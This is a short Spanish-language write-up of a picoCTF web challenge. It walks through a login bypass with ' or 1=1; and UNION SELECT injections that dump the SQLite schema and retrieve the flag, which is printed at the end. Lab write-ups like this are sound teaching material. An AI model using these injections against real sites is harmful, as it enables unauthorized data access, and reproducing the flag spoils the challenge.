## Descripción del reto
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:59943/).

## Solución
- Al ingresar a la pagina, empezamos colocando `admin ';`, con esto vemos que primero verifica el password, por lo tanto, ahora en ambos campos colocamos `' or 1=1;`.
![[Pasted image 20250925200614.png]]

![[Pasted image 20250925200639.png]]

![[Pasted image 20250925200804.png]]

- Ahora dentro de la pagina vemos que es una base de datos sobre la ciudad, probamos ingresando un comando de linux, dentro del espacio de búsqueda `ciudad' union select 1,2,3;`, con esto nos damos cuenta que es vulnerable.
![[Pasted image 20250925200915.png]]

- Después ingresamos el siguiente comando para conocer la versión del SQLite, en seguida vemos `ciudad' union select sqlite_version(),2,3;`,  para ver como esta compuesta la base de datos `ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table';`, al final utilizamos esta sentencia para ver la bandera `ciudad' union select 1,2,flag from more_table;`.
![[Pasted image 20250925201002.png]]

![[Pasted image 20250925201103.png]]

![[Pasted image 20250925201151.png]]


picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}
## Notas


## Referencia